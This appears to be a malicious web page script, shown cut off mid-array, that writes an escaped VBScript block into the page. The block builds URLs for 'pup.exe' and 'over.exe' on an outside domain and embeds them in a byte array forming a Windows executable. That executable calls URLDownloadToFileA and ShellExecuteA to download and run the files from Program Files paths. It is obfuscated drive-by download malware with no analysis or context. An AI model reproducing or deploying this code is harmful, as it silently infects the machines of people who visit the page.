

<SCRIPT>
base_path="http://www.achtungachtung.com/2k";

function LaunchSelfExec3()
	{
	
document.write(unescape('%3Cscript%20language%3D%22vbs%22%3E%0D%0A%0D%0Adomain%20%3D%20%22retardedinternetgeek.com%22%0D%0AFunction%20getPup%28%29%0D%0Adirectory%20%3D%20%22http%3A//%22+domain+%22/pup.exe%22%0D%0Athestr%20%3D%20%22%22%0D%0AFor%20i%20%3D%201%20to%2049%0D%0Aif%20i%20%3C%3D%20Len%28directory%29%20Then%20thestr%3Dthestr%20%26%20Asc%28Mid%28directory%2Ci%2C1%29%29%20Else%20thestr%3Dthestr%20%26%20%220%22%0D%0Athestr%3Dthestr%20%26%20%22%2C%22%0D%0ANext%0D%0AgetPup%20%3D%20thestr%0D%0AEnd%20Function%0D%0AFunction%20getOver%28%29%0D%0Adirectory%20%3D%20%22http%3A//%22+domain+%22/over.exe%22%0D%0Athestr%20%3D%20%22%22%0D%0AFor%20i%20%3D%201%20to%2050%0D%0Aif%20i%20%3C%3D%20Len%28directory%29%20Then%20thestr%3Dthestr%20%26%20Asc%28Mid%28directory%2Ci%2C1%29%29%20Else%20thestr%3Dthestr%20%26%20%220%22%0D%0Athestr%3Dthestr%20%26%20%22%2C%22%0D%0ANext%0D%0AgetOver%20%3D%20thestr%0D%0AEnd%20Function%0D%0A%0D%0A%09jelmersArray%3D%20eval%28%22array%2877%2C90%2C144%2C0%2C3%2C0%2C0%2C0%2C4%2C0%2C0%2C0%2C255%2C255%2C0%2C0%2C184%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C64%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C176%2C0%2C0%2C0%2C14%2C31%2C186%2C14%2C0%2C180%2C9%2C205%2C33%2C184%2C1%2C76%2C205%2C33%2C84%2C104%2C105%2C115%2C32%2C112%2C114%2C111%2C103%2C114%2C97%2C109%2C32%2C99%2C97%2C110%2C110%2C111%2C116%2C32%2C98%2C101%2C32%2C114%2C117%2C110%2C32%2C105%2C110%2C32%2C68%2C79%2C83%2C32%2C109%2C111%2C100%2C101%2C46%2C13%2C13%2C10%2C36%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C93%2C207%2C159%2C135%2C25%2C174%2C241%2C212%2C25%2C174%2C241%2C212%2C25%2C174%2C241%2C212%2C151%2C177%2C226%2C212%2C19%2C174%2C241%2C212%2C229%2C142%2C227%2C212%2C24%2C174%2C241%2C212%2C82%2C105%2C99%2C104%2C25%2C174%2C241%2C212%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C80%2C69%2C0%2C0%2C76%2C1%2C2%2C0%2C176%2C227%2C232%2C63%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C224%2C0%2C15%2C1%2C11%2C1%2C5%2C12%2C0%2C2%2C0%2C0%2C0%2C2%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C16%2C0%2C0%2C0%2C16%2C0%2C0%2C0%2C32%2C0%2C0%2C0%2C0%2C64%2C0%2C0%2C16%2C0%2C0%2C0%2C2%2C0%2C0%2C4%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C4%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C48%2C0%2C0%2C0%2C2%2C0%2C0%2C0%2C0%2C0%2C0%2C2%2C0%2C0%2C0%2C0%2C0%2C16%2C0%2C0%2C16%2C0%2C0%2C0%2C0%2C16%2C0%2C0%2C16%2C0%2C0%2C0%2C0%2C0%2C0%2C16%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C24%2C32%2C0%2C0%2C80%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C32%2C0%2C0%2C24%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C46%2C116%2C101%2C120%2C116%2C0%2C0%2C0%2C50%2C1%2C0%2C0%2C0%2C16%2C0%2C0%2C0%2C2%2C0%2C0%2C0%2C2%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C32%2C0%2C0%2C96%2C46%2C114%2C100%2C97%2C116%2C97%2C0%2C0%2C218%2C0%2C0%2C0%2C0%2C32%2C0%2C0%2C0%2C2%2C0%2C0%2C0%2C4%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C64%2C0%2C0%2C64%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C233%2C175%2C0%2C0%2C0%2C99%2C58%2C92%2C80%2C114%2C111%2C103%2C114%2C97%2C109%2C32%2C70%2C105%2C108%2C101%2C115%2C92%2C112%2C117%2C112%2C46%2C101%2C120%2C101%2C0%2C%22+getPup%28%29+%220%2C99%2C58%2C92%2C80%2C114%2C111%2C103%2C114%2C97%2C109%2C32%2C70%2C105%2C108%2C101%2C115%2C92%2C111%2C118%2C101%2C114%2C46%2C101%2C120%2C101%2C0%2C%22+getOver%28%29+%220%2C99%2C58%2C92%2C80%2C114%2C111%2C103%2C114%2C97%2C109%2C32%2C70%2C105%2C108%2C101%2C115%2C0%2C111%2C112%2C101%2C110%2C0%2C0%2C106%2C0%2C106%2C0%2C104%2C5%2C16%2C64%2C0%2C104%2C30%2C16%2C64%2C0%2C106%2C0%2C232%2C87%2C0%2C0%2C0%2C106%2C0%2C104%2C157%2C16%2C64%2C0%2C104%2C179%2C16%2C64%2C0%2C104%2C5%2C16%2C64%2C0%2C104%2C174%2C16%2C64%2C0%2C106%2C0%2C232%2C70%2C0%2C0%2C0%2C106%2C0%2C106%2C0%2C104%2C80%2C16%2C64%2C0%2C104%2C106%2C16%2C64%2C0%2C106%2C0%2C232%2C37%2C0%2C0%2C0%2C106%2C0%2C104%2C157%2C16%2C64%2C0%2C104%2C179%2C16%2C64%2C0%2C104%2C80%2C16%2C64%2C0%2C104%2C174%2C16%2C64%2C0%2C106%2C0%2C232%2C20%2C0%2C0%2C0%2C106%2C0%2C232%2C7%2C0%2C0%2C0%2C204%2C255%2C37%2C16%2C32%2C64%2C0%2C255%2C37%2C0%2C32%2C64%2C0%2C255%2C37%2C8%2C32%2C64%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C162%2C32%2C0%2C0%2C0%2C0%2C0%2C0%2C190%2C32%2C0%2C0%2C0%2C0%2C0%2C0%2C128%2C32%2C0%2C0%2C0%2C0%2C0%2C0%2C120%2C32%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C150%2C32%2C0%2C0%2C16%2C32%2C0%2C0%2C104%2C32%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C176%2C32%2C0%2C0%2C0%2C32%2C0%2C0%2C112%2C32%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C206%2C32%2C0%2C0%2C8%2C32%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C162%2C32%2C0%2C0%2C0%2C0%2C0%2C0%2C190%2C32%2C0%2C0%2C0%2C0%2C0%2C0%2C128%2C32%2C0%2C0%2C0%2C0%2C0%2C0%2C49%2C0%2C85%2C82%2C76%2C68%2C111%2C119%2C110%2C108%2C111%2C97%2C100%2C84%2C111%2C70%2C105%2C108%2C101%2C65%2C0%2C0%2C117%2C114%2C108%2C109%2C111%2C110%2C46%2C100%2C108%2C108%2C0%2C0%2C128%2C0%2C69%2C120%2C105%2C116%2C80%2C114%2C111%2C99%2C101%2C115%2C115%2C0%2C107%2C101%2C114%2C110%2C101%2C108%2C51%2C50%2C46%2C100%2C108%2C108%2C0%2C0%2C103%2C0%2C83%2C104%2C101%2C108%2C108%2C69%2C120%2C101%2C99%2C117%2C116%2C101%2C65%2C0%2C115%2C104%2C101%2C108%2C108%2C51%2C50%2C46%2C100%2C108%2C108%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2